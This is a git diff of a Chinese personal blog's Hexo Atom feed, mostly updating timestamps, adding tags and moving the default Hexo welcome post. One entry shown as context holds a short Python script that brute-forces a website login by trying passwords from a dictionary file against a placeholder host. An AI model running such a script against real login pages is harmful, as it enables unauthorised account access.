@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://aiwanxia.github.io/"/>
-  <updated>2017-03-06T04:22:21.539Z</updated>
+  <updated>2017-03-06T13:26:12.600Z</updated>
   <id>https://aiwanxia.github.io/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="https://aiwanxia.github.io/2017/03/05/%E5%88%A9%E7%94%A8hexo%E4%B8%8Enodejs%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
     <id>https://aiwanxia.github.io/2017/03/05/利用hexo与nodejs搭建博客/</id>
     <published>2017-03-05T03:31:21.000Z</published>
-    <updated>2017-03-06T04:22:21.539Z</updated>
+    <updated>2017-03-06T13:26:12.600Z</updated>
     
     <content type="html"><![CDATA[<p>我一直都想要拥有一个属于自己的博客，写下自己的无聊，偶然的机会，我在网上看到了一篇文章，教你如何用20min搭建一个属于自己的博客，看到这，我心动了，并且开始按照他的指示操作起来，就这样20多min后，我也拥有了属于自己的博客，成就感十足，现在，让我来带大家搭建一个属于自己的博客！</p>
 <ol>
@@ -195,6 +195,37 @@ INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.
     </summary>
     
     
+      <category term="hexo" scheme="https://aiwanxia.github.io/tags/hexo/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>初识hexo命令</title>
+    <link href="https://aiwanxia.github.io/2017/03/05/%E5%88%9D%E8%AF%86hexo%E5%91%BD%E4%BB%A4/"/>
+    <id>https://aiwanxia.github.io/2017/03/05/初识hexo命令/</id>
+    <published>2017-03-05T03:31:21.000Z</published>
+    <updated>2017-03-06T13:26:07.138Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
+    
+    </summary>
+    
+    
+      <category term="hexo" scheme="https://aiwanxia.github.io/tags/hexo/"/>
+    
   </entry>
   
   <entry>
@@ -202,7 +233,7 @@ INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.
     <link href="https://aiwanxia.github.io/2017/03/05/%E5%88%A9%E7%94%A8python%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/"/>
     <id>https://aiwanxia.github.io/2017/03/05/利用python进行暴力破解密码/</id>
     <published>2017-03-05T03:31:21.000Z</published>
-    <updated>2017-03-06T08:09:49.134Z</updated>
+    <updated>2017-03-06T13:26:23.543Z</updated>
     
     <content type="html"><![CDATA[<p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#encoding=utf-8</div><div class="line">import httplib,urllib</div><div class="line">conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)</div><div class="line">f=open(&quot;dict.txt&quot;) </div><div class="line">while 1:</div><div class="line">    pwd=f.readline().strip()</div><div class="line">    if not pwd:</div><div class="line">        print &apos;字典已比对完。&apos; </div><div class="line">        break </div><div class="line">    params = urllib.urlencode(&#123;&apos;username&apos;: &apos;xxx&apos;, &apos;mod&apos;: &apos;&apos;, &apos;password&apos;: pwd&#125;) </div><div class="line">    headers = &#123;&quot;Content-type&quot;:  &quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;&#125; </div><div class="line">    conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers) </div><div class="line">    r = conn.getresponse() </div><div class="line">    print r.status, r.reason </div><div class="line">    data1 = r.read().decode(&apos;gbk&apos;)#编码根据实际情况酌情处理  </div><div class="line">    print data1.index(u&apos;您输入的密码有误&apos;),&apos;您输入的密码\&apos;%s\&apos;有误&apos;%pwd </div><div class="line">  conn.close()</div></pre></td></tr></table></figure></p>
 ]]></content>
@@ -214,6 +245,8 @@ INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.
     </summary>
     
     
+      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
+    
   </entry>
   
   <entry>
@@ -221,7 +254,7 @@ INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.
     <link href="https://aiwanxia.github.io/2017/03/05/never-give-up/"/>
     <id>https://aiwanxia.github.io/2017/03/05/never-give-up/</id>
     <published>2017-03-05T02:58:52.000Z</published>
-    <updated>2017-03-06T02:11:31.741Z</updated>
+    <updated>2017-03-06T13:25:36.021Z</updated>
     
     <content type="html"><![CDATA[<p>hello,welcome to my personal blog!<br>搭建博客的时候遇见了很多坑，因为网上的教程大多都是hexo 2.X的，现在使用命令<code>npm install -g hexo-cli</code>安装的是最新版本，所以会常常出错，但是，never give up,只要你愿意找，你始终会找到答案的，相信自己可以的，不要放弃，下面我给大家讲讲搭建博客时的一些坑，及如何解决！</p>
 ]]></content>
@@ -232,6 +265,8 @@ INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.
     
     </summary>
     
+    
+      <category term="前言" scheme="https://aiwanxia.github.io/tags/%E5%89%8D%E8%A8%80/"/>
     
   </entry>
   
@@ -264,33 +299,6 @@ INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.
     
     
       <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>初识hexo命令</title>
-    <link href="https://aiwanxia.github.io/2017/03/05/%E5%88%9D%E8%AF%86hexo%E5%91%BD%E4%BB%A4/"/>
-    <id>https://aiwanxia.github.io/2017/03/05/初识hexo命令/</id>
-    <published>2017-03-05T02:39:36.204Z</published>
-    <updated>2017-03-05T15:15:54.766Z</updated>
-    
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
-    
-    </summary>
-    
     
   </entry>
   
